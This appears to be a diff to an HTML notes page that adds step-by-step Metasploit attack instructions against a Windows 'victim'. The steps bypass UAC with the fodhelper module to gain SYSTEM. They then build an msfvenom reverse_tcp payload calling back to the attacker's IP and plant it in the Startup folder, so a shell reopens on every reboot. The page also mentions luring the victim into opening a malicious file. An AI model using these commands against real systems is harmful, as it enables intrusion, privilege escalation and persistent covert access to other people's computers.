@@ -33,4 +33,35 @@
 <p>Send a link to the victim in order to open the malicious file</p>
 <h2>Meterpreter shell</h2>
 <p><ol><ul>getuid</ul>
+    <ul>background</ul>
+    <ul>use exploit/windows/local/bypassuac_fodhelper</ul>
+    <ul>set session 1</ul>
+    <ul>show options</ul>
+    <ul>set LHOST [MY IP ADDRESS]</ul>
+    <ul>set TARGET 0</ul>
+    <ul>exploit</ul>
+    <ul>getsystem -t 1</ul>
+    <ul>getuid</ul>
 </ol></p>
+    <h2>Startup folder</h2>
+    <p><ol><ul>
+        cd “C:\\ProgramData\\Start Menu\\Programs\\Startup”
+    </ul>
+    <ul>pwd</ul>
+        <ul>Start a new console with sudo su rights</ul>
+        <ul>msfvenom -p windows/meterpreter/reverse_tcp lhost=[MY IP ADDRESS] lport=8080 -f exe > payload.exe</ul>
+        <ul>Return to Metasploit console -> upload /home/attacker/payload.exe</ul>
+        <ul>Restart victim's Windows system</ul>
+        <ul>Starta new console with sudo su rights</ul>
+        <ul>Start metasploit in this new console</ul>
+        <ul>use exploit/multi/handler</ul>
+        <ul>set payload windows/meterpreter/reverse_tcp</ul>
+        <ul>set lhost [MY IP ADDRESS]</ul>
+        <ul>set lport 8080</ul>
+        <ul>exploit</ul>
+        <ul>Restart the victim's Windows machine so that the malicious file that is placed in the startup folder is executed</ul>
+        <ul>Eventually, after restart of the Windows system, the meterpreter session will be opened</ul>
+        <ul>getuid</ul>
+        <ul>Whenever the Admin restarts the system, a reverse shell is opened to the attacker until the payload is detected by the administrator</ul>
+        <ul>Thus attacker can maintain persistence on the target machine using misconfigured Startup folder</ul>
+    </ol></p>
